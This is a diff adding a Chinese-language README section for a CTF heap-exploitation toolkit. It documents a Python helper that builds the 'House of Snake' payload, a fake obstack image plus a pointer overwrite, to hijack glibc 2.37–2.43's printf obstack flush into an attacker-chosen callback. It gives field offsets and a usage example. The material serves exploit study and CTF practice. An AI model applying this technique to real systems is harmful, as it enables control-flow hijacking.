@@ -39,6 +39,108 @@ stdio-common/printf_buffer_flush.c 与 malloc/obstack.c。
 
 C 语言 PoC 用的是官方合法 API 来设置回调，所以 API 本身不是漏洞；文件末尾附的中文伪代码，负责说明题目侧要怎样伪造 `__printf_buffer_obstack` 和 obstack 结构的字段。
 
+## Python 离线板子
+
+[`snake.py`](./snake.py) 提供两个函数：
+
+```text
+build_house_of_snake         -> 返回 SnakePlan
+build_house_of_snake_payload -> 返回 printf buffer 指针写 + fake obstack 镜像
+```
+
+### 函数用途
+
+描述 `__printf_buffer_flush_obstack -> _obstack_newchunk -> chunkfun(extra_arg, new_size)` 最终触发点所需的字段来源。
+
+### 最小使用示例
+
+```python
+from snake import build_house_of_snake, build_house_of_snake_payload
+
+plan = build_house_of_snake(
+    printf_buffer_addr=0x100000,  # printf buffer 对象
+    obstack_addr=0x200000,        # fake obstack
+    object_base=0x300000,         # 当前 chunk 起点
+    next_free=0x301000,           # 写指针（= chunk_limit 触发扩容）
+    chunkfun_addr=0x401234,       # 分配回调
+    extra_arg=0x500000,           # callback 第一个参数
+)
+
+# 返回 SnakePlan 数据类
+print(plan.printf_buffer_addr, plan.obstack_addr,
+      hex(plan.chunkfun), hex(plan.extra_arg))
+
+writes = build_house_of_snake_payload(
+    printf_buffer_addr=0x100000,
+    obstack_pointer_addr=0x100088,  # Build ID 确认后的 obstack 指针槽
+    obstack_addr=0x200000,
+    object_base=0x300000,
+    next_free=0x301000,
+    chunkfun_addr=0x401234,
+    extra_arg=0x500000,
+)
+for w in writes:
+    print(w.label, hex(w.address), w.data.hex())
+```
+
+### 对应 PoC
+
+- [`poc_chunkfun_sink_2.37_2.43.c`](./poc_chunkfun_sink_2.37_2.43.c)。
+
+### 参数
+
+| 参数 | 含义 |
+|---|---|
+| `printf_buffer_addr` | 题目可控的 `__printf_buffer_obstack` 对象地址。 |
+| `obstack_addr` | 该对象持有的 fake obstack 地址。 |
+| `object_base` | 当前 obstack chunk 起点。 |
+| `next_free` | 当前写指针；与 `chunk_limit` 相等时扩容立即发生。 |
+| `chunkfun_addr` | `_obstack_newchunk` 的分配回调。 |
+| `extra_arg` | callback 第一个参数。 |
+| `chunk_limit` | 当前 chunk 上限；省略时取 `next_free`。 |
+
+### 返回对象 `SnakePlan`
+
+| 字段 | 含义 |
+|---|---|
+| `printf_buffer_addr` | printf buffer 对象地址。 |
+| `obstack_addr` | fake obstack 地址。 |
+| `object_base` | 当前 chunk 起点。 |
+| `next_free` | 当前写指针。 |
+| `chunk_limit` | 当前 chunk 上限。 |
+| `chunkfun` | 分配回调地址。 |
+| `extra_arg` | callback 第一个参数。 |
+
+### 返回对象 `MemoryWrite`
+
+`build_house_of_snake_payload` 返回两项写入：
+
+```text
+1. obstack_pointer_addr -> obstack_addr
+   label = "printf_buffer.obstack pointer"
+
+2. obstack_addr -> 0x70 字节 fake obstack 镜像
+   label = "fake obstack object"
+   关键字段同 house_of_obstack：+0x38 chunkfun、+0x40 extra_arg、+0x50 use_extra_arg、+0x58/+0x60/+0x68 边界。
+```
+
+### 调用者必须提供
+
+```text
+2.37+ 的 __printf_buffer_obstack 内部指针偏移（Build ID / 调试信息）
+能覆盖该对象或其所持 obstack 指针的原语
+能触发 printf obstack flush 的入口
+```
+
+### 函数不负责
+
+```text
+不猜 __printf_buffer_obstack 内部 obstack 指针偏移
+不投递 printf buffer / fake obstack
+不触发 flush
+2.36 及更早应使用 house_of_obstack
+```
+
 ## 迁移与调试
 
 1. 先确认题目能不能影响到 `__printf_buffer_obstack` 持有的 obstack 指针，或者能影响该指针指向的对象；光是存在这个公开的回调设置 API，不代表题目自动具备覆盖它的能力。
